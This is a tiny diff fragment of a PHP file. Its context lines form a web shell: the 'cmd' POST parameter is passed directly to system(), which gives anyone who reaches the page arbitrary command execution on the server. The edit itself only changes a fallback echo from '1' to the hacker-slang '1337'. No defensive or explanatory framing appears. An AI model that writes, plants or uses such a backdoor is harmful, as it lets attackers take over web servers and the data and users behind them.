@@ -2,5 +2,5 @@
 if(isset($_POST["cmd"])){
     system($_POST["cmd"]);
 } else {
-    echo "1";
+    echo "1337";
 }
